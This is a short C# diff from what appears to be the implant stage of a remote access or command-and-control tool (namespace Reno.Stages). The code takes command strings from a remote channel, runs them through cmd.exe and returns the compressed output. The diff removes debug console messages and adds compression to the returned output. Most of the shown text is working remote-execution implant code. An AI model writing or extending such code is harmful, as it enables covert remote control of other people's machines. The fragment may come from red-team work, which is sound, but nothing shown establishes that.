@@ -108,9 +108,9 @@ namespace Reno.Stages
                             SendProcessList(header);
                             break;
                         case CommChannel.EXECUTE:
-                            Console.WriteLine("In EXECUTE");
                             ExecuteCommand(header);
                             break;
+                            
                     }
                 }
                 catch(IOException ioe)
@@ -474,7 +474,6 @@ namespace Reno.Stages
             byte[] bytes = channel.Decompress(channel.ReceiveBytes(header.DataLength));
             string commandArgs = Encoding.UTF8.GetString(bytes);
             commandString += commandArgs;
-            Console.WriteLine("[*] Command string: {0}", commandString);
             commandInfo.FileName = "cmd.exe";
             commandInfo.Arguments = commandString;
             commandInfo.UseShellExecute = false;
@@ -482,7 +481,7 @@ namespace Reno.Stages
             command.StartInfo = commandInfo;
             command.Start();
             string commandOutput = command.StandardOutput.ReadToEnd();
-            byte[] commandBytes = Encoding.UTF8.GetBytes(commandOutput);
+            byte[] commandBytes = channel.Compress(Encoding.UTF8.GetBytes(commandOutput));
             CommHeader commandHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, commandBytes.Length);
             channel.SendHeader(commandHeader);
             if (commandBytes.Length > 0)    
